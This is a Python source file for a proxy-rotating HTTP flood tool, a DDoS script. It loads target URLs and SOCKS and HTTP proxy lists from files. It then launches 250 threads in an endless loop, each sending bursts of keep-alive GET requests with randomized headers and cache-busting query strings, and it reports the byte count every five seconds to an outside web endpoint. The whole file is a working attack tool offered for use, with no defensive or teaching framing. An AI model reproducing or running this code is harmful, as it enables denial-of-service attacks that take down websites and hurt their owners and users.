import time
import random
import socket
from xmlrpc.client import INTERNAL_ERROR
import socks
import ssl
import datetime
import threading
from threading import Lock
import requests

#DDOS SETTINGS
MAX_SIMPLE_CONNECTION_REQUESTS = 120
THREAD_COUNT = 250
TIMEOUT = 1.0                           # secs
USE_SOCKS_ONLY = False
#DDOS SETTINGS


def thread_protected_call(lock, func):
    lock.acquire()
    result = func()
    lock.release()
    return result

def load_lines(file_path):
    return open(file_path, 'r').read().split('\n')

def get_ms_time():  
    return round(time.time() * 1000)

class Stats:
    def __init__(self, start_time):
        self.__lock = Lock()
        self.__start_time = start_time
        self.__bytes = 0
        self.__good = 0
        self.__bad = 0
        self.__bad_proxy = 0

    def add_good(self, cnt = 1):
        self.__lock.acquire()
        self.__good += cnt
        self.__lock.release()
    
    def add_bad(self, cnt = 1):
        self.__lock.acquire()
        self.__bad += cnt
        self.__lock.release()

    def add_bad_proxy(self, cnt = 1):
        self.__lock.acquire()
        self.__bad_proxy += cnt
        self.__lock.release()

    def add_bytes(self, cnt = 1):
        self.__lock.acquire()
        self.__bytes += cnt
        self.__lock.release()

    def get_good(self):
        return self.__good

    def get_bad(self):
        return self.__bad

    def get_bad_proxy(self):
        return self.__bad_proxy

    def get_bytes(self):
        return self.__bytes

    def get_start_time(self):
        return self.__start_time.strftime("%m/%d/%Y, %H:%M:%S")

stats = Stats(datetime.datetime.now())
class Proxy:
    def __init__(self, ip, port, type):
        self.IP = ip
        self.PORT = port
        self.TYPE = type

    def __str__(self):
        return '<' + self.TYPE + '>' + self.IP + ':' + self.PORT

class Target:
    def __init__(self, host, port, path, protocol):
        self.HOST = host
        self.PORT = port
        self.PATH = path
        self.PROTOCOL = protocol

    def __str__(self):
        return self.PROTOCOL + '://' + self.HOST + ':' + str(self.PORT) + self.PATH
        

class TargetManager:
    def __init__(self):
        self.__targets = list()

    def __str__(self):
        result = '['
        first = True
        for i in self.__targets:
            if first:
                first = False
            else:
                result += ', \n'
            result += str(i)
        return result + ']'

    def create_target_from_url(url):
        if url[:8] == 'https://':
            url = url[8:]
            protocol = 'https'
        elif url[:7] == 'http://':
            url = url[7:]
            protocol = 'http'
        else:
            protocol = 'http'
        
        tmp = url.split('/')[0].split(':')
        host = tmp[0]

        if len(tmp) == 1:
            if protocol == 'http':
                port = 80
            else:
                port = 443
        else:
            port = tmp[1]

        path = url.replace(url.split('/')[0], '', 1)

        if len(path) == 0:
            path = '/'

        return Target(host, port, path, protocol)

    def load_from_file(self, file_path):
        try:
            lines = load_lines(file_path)
            result = []
            for str in lines:
                result.append(TargetManager.create_target_from_url(str))
            self.__targets += result
        except:
            pass

    def get_rand(self):
        return random.choice(self.__targets)

class ProxyManager:
    def __init__(self):
        self.__proxies = []

    def __str__(self):
        result = '['
        first = True
        for i in self.__proxies:
            if first:
                first = False
            else:
                result += ', \n'
            result += str(i)
        return result + ']'

    def get_rand(self):
        return random.choice(self.__proxies)
    
    def __get_proxy_from_str(str, proxy_type):
        proxy = str.split(':')
        return Proxy(proxy[0], proxy[1], proxy_type.lower())

    def load_from_file(self, file_path, proxy_type):
        try:
            file = open(file_path, 'r')
            lines = file.read().split('\n')
            result = []
            for str in lines:
                result.append(ProxyManager.__get_proxy_from_str(str, proxy_type))
            self.__proxies += result
        except:
            pass

class Requests:
    __userag = load_lines('useragent.txt')

    __acpt = [
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
            "Accept-Encoding: gzip, deflate\r\n",
            "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
            "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
            "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
            "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
            "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
            "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
            "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
            "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
            "Accept: text/html, application/xhtml+xml\r\n",
            "Accept-Language: en-US,en;q=0.5\r\n",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
            "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
        ]

    __referers = load_lines('referers.txt')

    def get_accept():
        return random.choice(Requests.__acpt)

    def get_useragent():
        return "User-Agent: " + random.choice(Requests.__userag) + "\r\n"

    def get_referer(url):
        return "Referer: " + random.choice(Requests.__referers) + url + "\r\n"

    def get_connect_request(target):
        return 'CONNECT ' + target.HOST + ':' + str(target.PORT) + ' HTTP/1.1\r\n\r\n'

    def get_extended_head(target):
        separator = "?"
        if "?" in target.PATH:
            separator = "&"
        get = "GET " + target.PROTOCOL + '://' + target.HOST + target.PATH + separator + str(random.randint(0, 20000)) + " HTTP/1.1\r\nHost: " + target.HOST + "\r\n"
        return get

    def get_simple_head(target):
        separator = "?"
        if "?" in target.PATH:
            separator = "&"
        get = "GET " + target.PATH + separator + str(random.randint(0, 20000)) + " HTTP/1.1\r\nHost: " + target.HOST + "\r\n"
        return get

    def gen_http_request(target, head=None):
        connection = "Connection: Keep-Alive\r\n"
        headers = Requests.get_referer(target.HOST + target.PATH) + \
                    Requests.get_useragent() + \
                    Requests.get_accept() + \
                    connection + "\r\n"
        if head == None:
            head = Requests.get_simple_head(target)
        return head + headers

class Attack:
    def create_connection_using_socks_proxy(proxy):
        s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        if proxy.TYPE == 'socks4':
            s.set_proxy(socks.SOCKS4, proxy.IP, int(proxy.PORT))
        elif proxy.TYPE == 'socks5':
            s.set_proxy(socks.SOCKS5, proxy.IP, int(proxy.PORT))
        else:
            raise Exception('Invalid proxy type')
        s.settimeout(TIMEOUT)
        return s

    def attack_url_socks(target, proxy):
        s = Attack.create_connection_using_socks_proxy(proxy)
        if target.PROTOCOL == 'https':
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.load_default_certs()
            s = ctx.wrap_socket(s, server_hostname = target.HOST)

        try:
            s.connect((target.HOST, int(target.PORT)))
        except Exception as e:
            s.close()
            stats.add_bad_proxy()
            return

        try:
            for id in range(MAX_SIMPLE_CONNECTION_REQUESTS):
                request = Requests.gen_http_request(target)
                sent = s.send(str.encode(request))
                if not sent:
                    stats.add_bad()
                    break
                else:
                    stats.add_bytes(len(request))
                    stats.add_good()
            s.close()
        except:
            stats.add_bad()
            s.close()

    def attack_url_http(target, proxy):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        try:
            s.connect((proxy.IP, int(proxy.PORT)))
        except Exception as e:
            stats.add_bad_proxy()
            return

        try:
            for id in range(MAX_SIMPLE_CONNECTION_REQUESTS):
                request = Requests.gen_http_request(target, head=Requests.get_extended_head(target))
                sent = s.send(str.encode(request))
                if not sent:
                    stats.add_bad()
                    break
                stats.add_bytes(len(request))
                stats.add_good()
            s.close()
        except:
            stats.add_bad()
            s.close()

    def attack_url_https(target, proxy):
################################################
#
#       attack_url_https ne pashe, tomu tut stoyit kostil
#
################################################

        port = target.PORT
        if port == 443:
            port = 80
        Attack.attack_url_http(Target(target.HOST, port, target.PATH, 'http'), proxy)

################################################
#
#       attack_url_https ne pashe, tomu tut stoyit kostil
#
################################################

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        try:
            s.connect((proxy.IP, int(proxy.PORT)))
        except:
            stats.add_bad_proxy()
            return

        try:
            for id in range(MAX_SIMPLE_CONNECTION_REQUESTS):
                connect_request = Requests.get_connect_request(target)
                sent = s.send(str.encode(connect_request))
                if not sent:
                    stats.add_bad()
                    break
                data = s.recv(1024)
                if '200 Connection established' in str(data) or '200 OK' in str(data):
                    request = Requests.gen_http_request(target)
                    sent = s.send(str.encode(request))
                    if not sent:
                        stats.add_bad()
                        break
                    stats.add_bytes(len(request))
                    stats.add_good()
            s.close()
        except Exception as e:
            stats.add_bad()
            s.close()

    def attack_url_http_https(target, proxy):
        if target.PROTOCOL == 'http':
            Attack.attack_url_http(target, proxy)
        elif target.PROTOCOL == 'https':
            Attack.attack_url_https(target, proxy)
        else:
            raise Exception('Invalid proxy type')

    def attack_url(target, proxy):
        if proxy.TYPE in ['socks4', 'socks5']:
            Attack.attack_url_socks(target, proxy)
        elif proxy.TYPE in ['http/https']:
            Attack.attack_url_http_https(target, proxy)

class DDoS:
    def __load(self):
        self.__target_manager.load_from_file('targets.txt')
        self.__proxy_manager.load_from_file('socks4.txt', 'socks4')
        self.__proxy_manager.load_from_file('socks5.txt', 'socks5')
        if not USE_SOCKS_ONLY:
            self.__proxy_manager.load_from_file('http_https.txt', 'http/https')

    def __init__(self):
        self.__proxy_manager = ProxyManager()
        self.__target_manager = TargetManager()

        self.__load()

    def run(self):
        while True:
            threads = []
        
            for i in range(THREAD_COUNT):
                threads.append(threading.Thread(target=Attack.attack_url, args=(self.__target_manager.get_rand(), self.__proxy_manager.get_rand())))
            
            for thread in threads:
                thread.start()
            
            for thread in threads:
                thread.join()

ddos = DDoS()
ddos_thread = threading.Thread(target=ddos.run)
ddos_thread.start()


cur_bytes = 0

def send_data():
    global cur_bytes
    while True:
        time.sleep(5)
        b = stats.get_bytes()
        print(b)
        requests.get("https://roflclicker.000webhostapp.com/ddos/getinfo.php?bytes="+str(b-cur_bytes))
        cur_bytes = b

data_thread = threading.Thread(target=send_data)
data_thread.start()
